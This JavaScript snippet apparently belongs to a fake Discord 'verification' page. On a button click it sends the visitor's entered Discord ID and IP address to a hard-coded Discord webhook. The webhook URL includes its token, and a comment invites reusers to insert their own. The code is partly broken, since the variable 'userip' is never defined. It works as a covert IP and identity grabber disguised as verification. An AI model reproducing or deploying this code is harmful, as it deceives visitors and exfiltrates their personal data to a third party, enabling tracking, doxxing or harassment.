function getip(json){
    alert(json.ip); // alerts the ip address
}

document.getElementById('button').addEventListener("click", function(ip) {
    var balls = document.getElementById('discordid').value;
    var request = new XMLHttpRequest();
    request.open("POST", "https://discordapp.com/api/webhooks/1033450138678607913/oNUp3ukzPbCEd6buK9Z1FUaxFio8iqbpDHng_-O7EBUODFiz5YmM8yiBAaSyg446OoZq");
    // again, replace the url in the open method with yours
    request.setRequestHeader('Content-type', 'application/json');
    
    var myEmbed = {
      author: {
        name: "Verification Log"
      },
      title: "Discord ID",
      description: balls + userip,
      color: hexToDecimal("#ff0000")
    }
    
    var params = {
      username: "MuflieBot",
      embeds: [ myEmbed ]
    }
    
    request.send(JSON.stringify(params));
    
    // function that converts a color HEX to a valid Discord color
    function hexToDecimal(hex) {
      return parseInt(hex.replace("#",""), 16)
    }
});